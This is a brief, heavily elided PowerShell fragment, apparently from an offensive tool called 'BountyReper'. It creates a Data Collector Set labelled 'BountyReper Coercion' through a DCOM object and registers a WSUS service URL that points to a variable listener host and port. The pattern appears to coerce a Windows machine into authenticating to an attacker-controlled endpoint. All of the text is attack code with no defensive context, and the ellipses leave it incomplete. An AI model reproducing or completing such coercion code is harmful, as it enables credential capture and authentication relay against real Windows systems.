...
<description>BountyReper</description>
...
<DataCollectorSet>
    ...
    <Description>BountyReper Coercion</Description>
</DataCollectorSet>
"@

    $dcom.SetXml($xml)
    $dcom.Commit("BountyReper", $null, 0x0003) | Out-Null
...
try {
    ...
    try {
        ...
        $manager.AddService2("BountyReper", 2, "https://${listener}:${port}/wsus")
